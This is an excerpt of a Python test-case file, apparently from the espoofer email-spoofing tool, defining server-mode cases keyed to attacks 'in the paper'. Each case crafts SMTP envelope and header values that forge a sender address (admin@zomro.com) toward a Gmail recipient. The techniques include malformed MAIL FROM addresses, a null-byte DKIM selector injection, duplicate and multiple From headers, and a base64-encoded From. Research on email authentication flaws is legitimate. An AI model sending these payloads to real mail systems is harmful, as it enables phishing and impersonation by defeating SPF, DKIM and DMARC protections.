...
# Important note:
#
# For server mode, all case_id should start with 'server_'.  All of gitdi.us, admin@zomro.com, and adeghoui90@gmail.com in thos cases will be replaced with the configured value in config.py.
# 
...
test_cases = {
    "server_a1": {
        "helo": b"helo.gitdi.us",
        "mailfrom": b"<any@mailfrom.notexist.zomro.com>",
        "rcptto": b"<adeghoui90@gmail.com>",
        #"dkim_para": {"d":b"gitdi.us", "s":b"selector", "sign_header": b"From: <admin@zomro.com>"},
        "data": {
            "from_header": b"From: <admin@zomro.com>\r\n",
            "to_header": b"To: <adeghoui90@gmail.com>\r\n",
            "subject_header": b"Subject: A1: Non-existent subdomain\r\n",
            "body": b"Hi, this is a test message! Best wishes.\r\n",
            "other_headers": b"Date: " + get_date() + b"\r\n" + b'Content-Type: text/plain; charset="UTF-8"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-' + id_generator() + b'@message-ids.gitdi.us>\r\nX-Email-Client: https://github.com/chenjj/espoofer\r\n\r\n',
        },
        "description": b"Non-existent subdomains in MAIL FROM, refer to A1 attack in the paper."
    },
    "server_a2": {
        "helo": b"gitdi.us",
        "mailfrom": b"<(any@zomro.com>",
        "rcptto": b"<adeghoui90@gmail.com>",
        # "dkim_para": {"d":b"gitdi.us", "s":b"selector", "sign_header": b"From: <ceo@zomro.com>"},
        "data": {
            "from_header": b"From: <admin@zomro.com>\r\n",
            "to_header": b"To: <adeghoui90@gmail.com>\r\n",
    ...
    "server_a3": {
        "helo": b"33.gitdi.us",
        "mailfrom": b"<any@33.gitdi.us>",
        "rcptto": b"<adeghoui90@gmail.com>",
        "dkim_para": {"d":b"zomro.com", "s":b"selector._domainkey.gitdi.us.\x00.any", "sign_header": b"From: <admin@zomro.com>"},
        "data": {
            "from_header": b"From: <admin@zomro.com>\r\n",
            "to_header": b"To: <adeghoui90@gmail.com>\r\n",
    ...
    "server_a4": {
        "helo": b"gitdi.us",
        "mailfrom": b"<any@gitdi.us>",
        "rcptto": b"<adeghoui90@gmail.com>",
        "dkim_para": {"d":b"zomro.com'a.gitdi.us", "s":b"selector", "sign_header": b"From: <admin@zomro.com>"},
        "data": {
            "from_header": b"From: <admin@zomro.com>\r\n",
            "to_header": b"To: <adeghoui90@gmail.com>\r\n",
    ...
    "server_a5": {
        "helo": b"gitdi.us",
        "mailfrom": b"<any@zomro.com(a.gitdi.us>",
        "rcptto": b"<adeghoui90@gmail.com>",
        # "dkim_para": {"d":b"zomro.com(.gitdi.us", "s":b"selector", "sign_header": b"From: <ceo@zomro.com>"},
        "data": {
            "from_header": b"From: <admin@zomro.com>\r\n",
            "to_header": b"To: <adeghoui90@gmail.com>\r\n",
    ...
    "server_a6": {
        "helo": b"gitdi.us",
        "mailfrom": b"<any@zomro.com'@any.gitdi.us>",
        "rcptto": b"<adeghoui90@gmail.com>",
        # "dkim_para": {"d":b"zomro.com(.gitdi.us", "s":b"selector", "sign_header": b"From: <ceo@zomro.com>"},
        "data": {
            "from_header": b"From: <admin@zomro.com>\r\n",
    ...
    "server_a7": {
        "helo": b"gitdi.us",
        "mailfrom": b"<@zomro.com,@any.com:'any@gitdi.us>",
        "rcptto": b"<adeghoui90@gmail.com>",
        # "dkim_para": {"d":b"zomro.com(.gitdi.us", "s":b"selector", "sign_header": b"From: <ceo@zomro.com>"},
        "data": {
            "from_header": b"From: <admin@zomro.com>\r\n",
    ...
    "server_a8": {
        ...
        # "dkim_para": {"d":b"zomro.com(.gitdi.us", "s":b"selector", "sign_header": b"From: <ceo@zomro.com>"},
        "data": {
            "from_header": b"From: <first@gitdi.us>\r\nFrom: <admin@zomro.com>\r\n",
            "to_header": b"To: <adeghoui90@gmail.com>\r\n",
    ...
    "server_a14": {
        ...
        "mailfrom": b"<any@gitdi.us>",
        "rcptto": b"<adeghoui90@gmail.com>",
        # "dkim_para": {"d":b"gitdi.us", "s":b"selector", "sign_header": b"From: <first@zomro.com>, <second@gitdi.us>"},
        "data": {
            "from_header": b"From: <first@gitdi.us>, <admin@zomro.com>\r\n",
            "to_header": b"To: <adeghoui90@gmail.com>\r\n",
            "subject_header": b"Subject: A14: Multiple address in From header\r\n",
            "body": b"Hi, this is a test message! Best wishes.\r\n",
            "other_headers": b"Date: " + get_date() + b"\r\n" + b'Sender: <s@sender.zomro.com>\r\nContent-Type: text/plain; charset="UTF-8"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-' + id_generator() + b'@message-ids.gitdi.us>\r\nX-Email-Client: https://github.com/chenjj/espoofer\r\n\r\n',
        },
    ...
    "server_a15": { #works on yahoo_web, outlook_web
        ...
        # "dkim_para": {"d":b"zomro.com(.gitdi.us", "s":b"selector", "sign_header": b"From: <ceo@zomro.com>"},
        "data": {
            "from_header": b"From:" + bs64encode(b"<admin@zomro.com>")+ b",<second@gitdi.us>\r\n",
            "to_header": b"To: <adeghoui90@gmail.com>\r\n",
    ...
    "server_a16": {
        ...
        "mailfrom": b"<any@gitdi.us>",
        "rcptto": b"<adeghoui90@gmail.com>",
        #"dkim_para": {"d":b'zomro.com"=(.gitdi.us', "s":b"selector", "sign_header": b"From: <any@gitdi.us>"},
        "data": {
            "from_header": b"From: <@gitdi.us,@any.com:admin@zomro.com>\r\n",
            "to_header": b"To: <adeghoui90@gmail.com>\r\n",
    ...
    "server_a17": {
        ...
        #"dkim_para": {"d":b'zomro.com"=(.gitdi.us', "s":b"selector", "sign_header": b"From: <any@gitdi.us>"},
        "data": {
            "from_header": b"From: <admin@zomro.com>\,<second@gitdi.us>\r\n",
            "to_header": b"To: <adeghoui90@gmail.com>\r\n",
    ...
    "server_a19": {
        ...
        #"dkim_para": {"d":b'zomro.com"=(.gitdi.us', "s":b"selector", "sign_header": b"From: <any@gitdi.us>"},
        "data": {
            "from_header": b"From: <any@gitdi.us>admin@zomro.com\r\n",
            "to_header": b"To: <adeghoui90@gmail.com>\r\n",
